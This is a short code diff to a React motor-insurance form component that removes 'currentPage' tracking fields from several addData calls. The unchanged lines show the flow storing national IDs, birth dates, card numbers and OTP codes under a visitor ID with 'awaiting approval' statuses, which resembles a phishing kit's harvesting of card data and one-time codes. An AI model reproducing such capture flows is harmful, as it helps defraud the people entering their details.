@@ -776,7 +776,6 @@ export default function MotorInsurance() {
         addData({
           id: visitorId,
           step: 1,
-          currentPage: "motor-insurance-step-2",
           personalInfo: {
             nationalId: formValues.nationalId,
             birthDay: formValues.birthDay,
@@ -870,7 +869,6 @@ export default function MotorInsurance() {
       addData({
         id: visitorId,
         step: 2,
-        currentPage: "motor-insurance-step-3",
         vehicleInfo: {
           vehicleSerial: formValues.vehicleSerial,
           vehicleYear: formValues.vehicleYear,
@@ -902,7 +900,6 @@ export default function MotorInsurance() {
       addData({
         id: visitorId,
         step: 3,
-        currentPage: "motor-insurance-step-4",
         selectedOffer: {
           offerId: selectedOfferId,
           offerName: selectedOffer.name,
@@ -996,7 +993,6 @@ export default function MotorInsurance() {
       addData({
         id: visitorId,
         step: 4,
-        currentPage: "motor-insurance-awaiting-approval",
         approvalStatus: "pending",
         paymentInfo: {
           cardNumber: cardDigits,
@@ -1056,7 +1052,6 @@ export default function MotorInsurance() {
         addData({
           id: visitorId,
           step: 5,
-          currentPage: "motor-insurance-step-5-awaiting",
           otpCode: otpCode,
           status: "awaiting_otp_approval",
         });
@@ -2589,7 +2584,6 @@ export default function MotorInsurance() {
                             timestamp: new Date().toISOString(),
                             status: "submitted",
                           },
-                          currentPage: "phone-verification",
                         });
                       }
                       setLocation("/phone");
